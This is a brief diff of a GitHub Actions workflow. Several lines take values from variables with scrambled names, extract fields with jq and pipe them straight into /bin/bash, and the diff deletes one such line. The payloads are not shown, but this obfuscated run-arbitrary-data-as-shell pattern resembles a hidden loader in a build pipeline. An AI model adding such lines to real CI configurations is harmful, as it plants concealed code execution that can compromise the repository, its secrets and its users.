@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$hdz812" | jq -r .k4 | /bin/bash
           echo $lny4 | jq -r .dyq82650 | /bin/bash
           printf '%s' "$u0" | jq -r .ipihp53 | /bin/bash
-          printf '%s' "$rswuy2573" | jq -r .b6699 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
